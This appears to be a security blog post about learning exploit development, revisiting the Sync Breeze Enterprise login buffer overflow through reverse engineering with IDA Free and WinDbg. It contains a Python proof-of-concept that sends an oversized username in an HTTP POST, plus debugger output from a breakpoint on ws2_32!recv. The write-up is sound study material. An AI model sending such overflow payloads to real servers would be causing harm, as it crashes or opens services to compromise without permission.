# Sync Breeze Revisited

At the time of writing I am studying Offensive Security Windows User Mode Exploit Development (EXP-301). I completed the Offensive Security Certified Expert (OSCE) a few years ago and really enjoyed it. However, I am finding that EXP-301 goes in to much more depth than the OSCE. That is probably because the new OSCE<sup>3</sup> is split into three areas that were covered in the single Cracking the Perimeter course of old.

I have started studying the reverse engineering section in the course and I am finding it very interesting if hard going. Firstly, `Ghidra` is not permitted on the exam, which means I have to learn how to use `IDA Free` and reverse engineering is a slow process to me anyway. Whilst the course content is good I felt I needed a bit more practice reversing Windows PE files.

A quick Google led me to this great blog page: [Vulnserver Redux 1: Reverse Engineering TRUN](https://www.purpl3f0xsecur1ty.tech/2021/05/26/trun_re.html) by Purpl3 F0x Secur1ty, I used this as a starting point and attempted to reverse engineer the PE file, using the blog when I got lost, which thankfully wasn't too often.

I decided that I would revisit the Sync-Breeze buffer overflow vulnerability introduced in the first chapter of the course, but this time I would attempt to reverse engineer it, rather than fuzz it. The public vulnerability is [here](https://www.exploit-db.com/exploits/42928).

## Goal

The goal of this exercise was for me to get better at reverse engineering using `IDA Free` and `WinDbg` and hopefully it will help anybody reading this too, and it may even help people understand stack based buffer overflow vulnerabilities at a lower level.

## The Proof of Concept

I started with a similar Proof of Concept, but I reduced the size of the payload to test against the username field. The exploit will be written in `Python` because that's what all exploits are written in duh!

```python
import socket, sys

server = sys.argv[1]
port = 80
size = 100

payload = b"A" * size
content = b"username=" + payload + b"&password=A"

buffer =  b"POST /login HTTP/1.1\r\n"
buffer += b"Host: " + server.encode() + b"\r\n"
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
buffer += b"Referer: http://192.168.211.149/login\r\n"
buffer += b"Connection: close\r\n"
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
buffer += b"\r\n"
buffer += content

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()
    print("Done!")
except socket.error:
    print("Unable to connect!")
```

## Hooking the RECV function

I attached `WinDbg` to the `syncbrs.exe` process and issued the `lm` command to view the loaded modules:

```
0:007> lm
start    end        module name
...       
772f0000 77353000   WS2_32     (deferred)    
```

I configured a breakpoint on the `ws2_32!recv` function:

```
0:007> bp ws2_32!recv
```

I ran the PoC, and the breakpoint was hit. This is the starting point for reversing the username field. At this point I have no idea how long or difficult this is going to be... Eyes down for a full house!

```
Breakpoint 0 hit
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=00000448 ebx=00fceee8 ecx=011745d8 edx=0063d744 esi=0063cf5c edi=00002800
eip=773023a0 esp=0063cf20 ebp=0063d744 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
WS2_32!recv:
773023a0 8bff            mov     edi,edi
```
